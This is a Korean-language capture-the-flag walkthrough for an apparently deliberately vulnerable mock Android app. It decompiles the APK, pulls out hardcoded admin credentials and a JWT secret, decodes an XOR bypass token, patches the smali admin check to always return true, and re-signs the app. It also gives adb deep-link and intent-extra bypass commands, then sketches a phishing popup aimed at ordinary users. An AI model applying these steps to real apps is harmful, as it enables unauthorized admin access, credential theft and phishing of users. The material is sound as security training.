# Phase 1: APK 디컴파일 → 크레덴셜 추출 → Smali 패치 → 권한 상승

## 사전 준비

```bash
# apktool 설치 확인
apktool --version

# jadx 설치 확인
jadx --version

# Java 확인 (서명에 필요)
java -version
```

---

## STEP 1: apktool 디컴파일

```bash
apktool d app-debug.apk -o bookvillage_decompiled --no-res
```

디컴파일 결과 디렉토리:
```
bookvillage_decompiled/
├── AndroidManifest.xml          ← 딥링크, 권한, 컴포넌트 노출
├── smali/
│   └── com/bookvillage/mock/
│       ├── MainActivity.smali
│       ├── MainActivity$AppBridge.smali
│       └── AdminPanelActivity.smali
└── res/
```

---

## STEP 2: jadx로 크레덴셜 추출

```bash
jadx app-debug.apk -d bookvillage_jadx
```

### 발견되는 하드코딩 정보 (MainActivity.kt → jadx 결과)

```java
// jadx 디컴파일 결과: MainActivity.java
private final String homeUrl = "http://book-village-alb-...elb.amazonaws.com/";
private final String API_KEY = "bv-internal-2024-secret";        // ← API 키
private final String DB_PASSWORD = "1234";                        // ← DB 비밀번호
private final String ADMIN_USERNAME = "admin";                    // ← 관리자 ID
private final String ADMIN_PASSWORD = "admin1234";                // ← 관리자 비밀번호
private final String JWT_SECRET = "bv-jwt-signing-key-do-not-share"; // ← JWT 서명 키
```

```java
// jadx 디컴파일 결과: AdminPanelActivity.java
private static final String BACKEND = "http://book-village-alb-...elb.amazonaws.com";
private static final String JWT_SECRET = "bv-jwt-signing-key-do-not-share";

// XOR 인코딩 bypass 토큰 배열도 노출
private static final byte[] ENCODED_BYPASS = {0x01, 0x02, 0x6B, ...};
private static final byte[] XOR_KEY = {'C', 'T', 'F'};
```

### XOR 디코딩 (Python으로 즉시 복호화)

```python
encoded = [0x01, 0x02, 0x6B, 0x01, 0x0D, 0x16, 0x02, 0x07, 0x15,
           0x6E, 0x1F, 0x03, 0x1A, 0x79, 0x74, 0x73, 0x66, 0x72]
key = [ord('C'), ord('T'), ord('F')]
result = ''.join(chr(b ^ key[i % 3]) for i, b in enumerate(encoded))
print(result)  # → BV-BYPASS-KEY-2024
```

---

## STEP 3: Smali 패치 (관리자 인증 분기 강제 우회)

### 패치 대상 파일 찾기

```bash
grep -r "checkIsAdmin\|equalsIgnoreCase\|ADMIN" bookvillage_decompiled/smali/
```

`MainActivity.smali` 에서 `checkIsAdmin` 메서드를 찾는다:

### 원본 Smali (패치 전)

```smali
# MainActivity.smali
.method private checkIsAdmin(Ljava/lang/String;)Z
    .registers 3

    const-string v0, "ADMIN"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_false     # ← 이 분기가 핵심: v0==0(false)이면 cond_false로 점프

    const/4 v0, 0x1
    return v0                  # role=="ADMIN" 일 때만 여기 도달

    :cond_false
    const/4 v0, 0x0
    return v0                  # 일반 유저는 여기서 false 반환

.end method
```

### 패치 방법 1: 분기 반전 `if-eqz` → `if-nez`

```smali
.method private checkIsAdmin(Ljava/lang/String;)Z
    .registers 3

    const-string v0, "ADMIN"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_false     # ← if-eqz를 if-nez로 변경
                               #   이제 v0==1(ADMIN 매치)일 때 cond_false로 점프
                               #   → 항상 true 경로 실행

    const/4 v0, 0x1
    return v0                  # 모든 role에서 여기 도달 → 항상 true

    :cond_false
    const/4 v0, 0x0
    return v0

.end method
```

### 패치 방법 2: 메서드 전체를 항상 true 반환으로 교체 (더 간단)

```smali
.method private checkIsAdmin(Ljava/lang/String;)Z
    .registers 2

    const/4 v0, 0x1    # true
    return v0          # 무조건 true 반환

.end method
```

---

## STEP 4: 재패키징 + 서명

```bash
# 재패키징
apktool b bookvillage_decompiled -o bookvillage_patched.apk

# 서명 키 생성 (최초 1회)
keytool -genkey -v \
  -keystore ctf.keystore \
  -alias ctf \
  -keyalg RSA \
  -keysize 2048 \
  -validity 10000 \
  -dname "CN=CTF, OU=CTF, O=CTF, L=Seoul, S=Seoul, C=KR" \
  -storepass ctf1234 \
  -keypass ctf1234

# APK 서명
jarsigner -verbose \
  -sigalg SHA1withRSA \
  -digestalg SHA1 \
  -keystore ctf.keystore \
  -storepass ctf1234 \
  bookvillage_patched.apk ctf

# zipalign 정렬 (선택)
zipalign -v 4 bookvillage_patched.apk bookvillage_patched_aligned.apk

# 에뮬레이터/기기에 설치
adb install -r bookvillage_patched_aligned.apk
```

---

## STEP 5: 공격 실행 및 결과 확인

### 방법 1: Smali 패치 APK로 일반 계정 권한 상승 (Challenge G)

```
1. 패치된 APK 설치
2. 앱 실행 → 일반 계정 (예: test@test.com / 1234) 으로 로그인
3. 페이지 로드 시 /api/users/me 호출 → role="USER" 반환
4. checkIsAdmin("USER") → 패치 후 항상 true → 관리자 버튼 노출
5. 관리자 패널 진입 성공
```

### 방법 2: 추출한 크레덴셜로 직접 로그인 (Path A)

```bash
# jadx에서 추출한 admin/admin1234 로 관리자 패널 로그인
# AdminPanelActivity 열기 + 크레덴셜 입력
adb shell am start \
  -n com.bookvillage.mock/.AdminPanelActivity

# 또는 딥링크로 XOR 우회
adb shell am start \
  -a android.intent.action.VIEW \
  -d "bookvillage://admin-panel?token=BV-BYPASS-KEY-2024" \
  com.bookvillage.mock
```

### 방법 3: Intent Extra 주입 (Bypass D, 재패키징 불필요)

```bash
adb shell am start \
  -n com.bookvillage.mock/.AdminPanelActivity \
  --es admin_token "x-x-x-admin-x-x"
```

---

## 결과 요약

| 방법 | 도구 | 재패키징 필요 |
|------|------|--------------|
| Smali 패치 (if-eqz→if-nez) | apktool | ✅ 필요 |
| 크레덴셜 추출 후 직접 로그인 | jadx | ❌ 불필요 |
| XOR 바이패스 토큰 딥링크 | jadx + python | ❌ 불필요 |
| Intent Extra 주입 | adb | ❌ 불필요 |

---

## 관리자 권한 획득 후 → Phase 2

관리자 패널에서 "웹 관리자 패널 열기" 클릭
→ `http://.../admin` 으로 이동
→ 팝업 등록: 제목="긴급 보안 업데이트", linkUrl=피싱페이지URL
→ 일반 사용자 앱에서 팝업 클릭 → 피싱 페이지 로딩 (Phase 3)
